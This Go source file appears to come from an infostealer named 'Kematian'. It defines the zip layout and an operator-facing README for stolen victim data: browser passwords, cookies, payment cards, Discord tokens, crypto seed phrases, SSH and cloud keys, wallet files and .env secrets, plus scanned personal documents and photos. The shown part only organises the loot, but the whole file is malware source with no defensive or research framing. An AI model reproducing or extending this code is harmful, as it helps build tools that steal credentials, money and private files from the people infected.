package main

// Zip layout (primary harvest + scanned-files uploads):
//
//	summary.txt
//	README.txt
//	logs/browsers/     passwords, cookies, history, bookmarks, autofill, cards, extensions.json
//	logs/apps/         WiFi, FileZilla, VPN, gaming
//	logs/discord/      discord tokens
//	logs/seeds/        seed phrases
//	logs/keys/         SSH/cloud keys, password candidates
//	logs/meta/         harvest.json, wallets.json, files.json, telegram.json
//	wallets/browser-extensions/{Wallet-Browser-Profile}/...
//	wallets/desktop/{WalletName}/...
//	env/{parent}/.env
//	files/documents/   PDF, Office, text (phase-2 zip)
//	files/images/      photos, screenshots (phase-2 zip)
//	files/other/       everything else (phase-2 zip)

const (
	zipLogsBrowsers     = "logs/browsers/"
	zipLogsApps         = "logs/apps/"
	zipLogsDiscord      = "logs/discord/"
	zipLogsSeeds        = "logs/seeds/"
	zipLogsKeys         = "logs/keys/"
	zipLogsMeta         = "logs/meta/"
	zipWalletsExtension = "wallets/browser-extensions/"
	zipWalletsDesktop   = "wallets/desktop/"
)

func zipReadmeText() string {
	return `Kematian harvest — folder layout
================================

summary.txt          Quick counts (start here)
README.txt           This file

logs/browsers/       Saved passwords, cookies, history, bookmarks, autofill, cards
logs/apps/           WiFi, FileZilla, VPN profiles, gaming accounts
logs/discord/        Discord tokens
logs/seeds/          Seed phrase scan results
logs/keys/           SSH/cloud keys, password-candidate list
logs/meta/           Full harvest.json + wallet/file indexes

wallets/browser-extensions/   Browser extension wallet data (MetaMask, etc.)
wallets/desktop/              Desktop wallet app data (Exodus, Ledger, etc.)

env/                 .env files found on disk

files/documents/     Scanned PDFs, text, Office docs (separate upload if large)
files/images/        Scanned images and screenshots
files/other/         Other scanned files
`
}